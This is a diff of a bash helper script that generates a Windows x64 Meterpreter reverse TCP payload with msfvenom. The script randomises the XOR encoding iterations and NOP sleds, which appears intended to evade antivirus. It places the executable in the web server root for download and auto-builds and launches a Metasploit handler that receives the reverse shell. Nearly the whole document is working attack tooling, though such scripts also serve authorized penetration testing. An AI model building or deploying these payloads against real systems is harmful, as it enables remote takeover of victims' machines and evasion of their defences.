@@ -1,21 +1,58 @@
-winmetrev_tcp_stager() {
-  # Makes a Staged Windows Meterpreter Reverse TCP Payload
+winx64metrev_tcp_staged() {
+  # Makes an Inline Windows Meterpreter Reverse Payload
   # enables UUID Tracking (whitelisting) for payloads, ignores the rest
-  lhost=$1
-  lport=$2
+  # raw payload, no template version
+  setstaticvars() {
+    if [ -z $msfc ]; then `# setting the msfconsole variable`
+      msfc=`locate msfconsole | grep metasploit`
+    fi
+    if [ -z $msfv ]; then `# setting the msfvenom variable`
+      msfv=`locate msfvenom | grep metasploit`
+    fi
+    if [ -z $msfs ]; then `# setting the metasploit scripts dir variable`
+      msfs=`echo $msfc | sed -r 's/(.*)msfconsole/\1scripts/g'`
+    fi
+    if [ -z $webdir ]; then `# setting the web directory variable`
+      webdir="/var/www/html/"
+    fi
+    if [ -z "`grep makeXtermLog /${USER}/.bashrc`" ]; then 
+      `# if the function makeXtermLog is not in the users /.bashrc file`
+      echo "No makeXtermLog function found in users bashrc file"
+    fi
+  }
+  setstaticvars
+  getsysargs() {
+    if [ ! -z $1 ]; then
+      lhost=$1
+    else
+      echo "This is where you enter the listener IP address"
+    fi
+    if [ ! -z $2 ]; then
+      lport=$2
+    else
+      echo "This is where you enter the listener port number"
+    fi
+    if [ ! -z $3 ]; then
+      p_name=$3
+      f_type=`echo $3 | cut -d"." -f2`
+    else
+      p_name="Winx64MetRevTCPStager_$lport"
+      f_type="exe"
+    fi
+  }
+  getsysargs $1 $2 $3
   setpayvars() {
-    d_payload="-p windows/meterpreter/reverse_tcp"
+    d_payload="-p windows/x64/meterpreter/reverse_tcp"
     d_lhost="set lhost=$lhost"
     d_lport="set lport=$lport"
-    d_encode="-e x86/shikata_ga_nai -i 10"
-    d_nop="-n 100"
-    d_format="-f exe -k"
+    d_encode="-e x64/xor -i `echo ${RANDOM}| sed -r "s/([0-9]{2})(.*)/\1/g"`"
+    d_nop="-n ${RANDOM}"
+    d_format="-f $f_type"
     d_small="--smallest"
     d_ignore="IgnoreUnknownPayloads=true"
-    d_uuid="PayloadUUIDName=WinMetRevTCPStager"
+    d_uuid="PayloadUUIDName=$pname"
     d_track="PayloadUUIDTracking=true"
     d_work="WORKSPACE "
-    d_binary="-x /usr/share/windows-binaries/radmin.exe"
   }
   setpayvars
   paygen() {
@@ -29,9 +66,8 @@ winmetrev_tcp_stager() {
       $d_small \
       $d_ignore \
       $d_uuid \
-      $d_track \
-      $d_binary`
-    msfvenom $paydirt > /var/www/html/winmetrev_tcp_stager.exe
+      $d_track`
+    $msfv $paydirt > $webdir$p_name
   }
   paygen
   sethandlervars() {
@@ -41,22 +77,25 @@ winmetrev_tcp_stager() {
     d_lhost="set lhost 0.0.0.0"
     d_lport="set lport $lport"
     d_ignore="set IgnoreUnknownPayloads true"
-    d_uuid="set PayloadUUIDName WinMetRevTCPStager"
+    d_uuid="set PayloadUUIDName $p_name"
     d_track="set PayloadUUIDTracking true"
     d_work="WORKSPACE "
+    d_exit="set existonsession false"
+    rcfile="$msfs/`echo $p_name`_handler.rc"
   }
   sethandlervars
   rcgen() {
-    echo $d_use > $msfs/inline_winmetrev_tcp_inline_handler.rc
-    echo $d_payload >> $msfs/inline_winmetrev_tcp_inline_handler.rc
-    echo $d_lport >> $msfs/inline_winmetrev_tcp_inline_handler.rc
-    echo $d_lhost >> $msfs/inline_winmetrev_tcp_inline_handler.rc
-    echo $d_ignore >> $msfs/inline_winmetrev_tcp_inline_handler.rc
-    echo $d_uuid >> $msfs/inline_winmetrev_tcp_inline_handler.rc
-    echo $d_track >> $msfs/inline_winmetrev_tcp_inline_handler.rc
-    echo exploit -j -z >> $msfs/inline_winmetrev_tcp_inline_handler.rc
+    echo $d_use > $rcfile
+    echo $d_payload >> $rcfile
+    echo $d_lport >> $rcfile
+    echo $d_lhost >> $rcfile
+    echo $d_ignore >> $rcfile
+    echo $d_uuid >> $rcfile
+    echo $d_track >> $rcfile
+    echo $d_exit >> $rcfile
+    echo exploit -j -z >> $rcfile
   }
   rcgen
-  (makeXtermLog "Meterpreter_Handler_WinMetRev_TCP_Inline" "$msfc -r $msfs/inline_winmetrev_tcp_inline_handler.rc") &
+  (makeXtermLog "Meterpreter_Handler_$p_name" "$msfc -r $rcfile") &
 }
-winmetrev_tcp_stager 192.168.100.118 4443
+winx64metrev_tcp_staged 192.168.100.118 4441 testingmystager.exe
